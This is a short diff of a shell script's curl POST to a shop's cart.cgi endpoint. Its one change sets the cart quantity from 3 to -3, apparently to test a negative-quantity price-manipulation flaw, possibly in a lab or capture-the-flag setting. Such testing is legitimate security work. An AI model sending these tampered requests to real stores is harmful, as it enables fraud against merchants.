@@ -27,6 +27,6 @@ curl "https://$auth/cgi-bin/cart.cgi" \
 	-H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"' \
 	-H 'sec-ch-ua-mobile: ?0' \
 	-H 'sec-ch-ua-platform: "macOS"' \
-	--data-raw 'product_id=3&lang=&shop_id=loja_dos_sonhos&quantity=3&return=shop' \
+	--data-raw 'product_id=3&lang=&shop_id=loja_dos_sonhos&quantity=-3&return=shop' \
 	--compressed
 
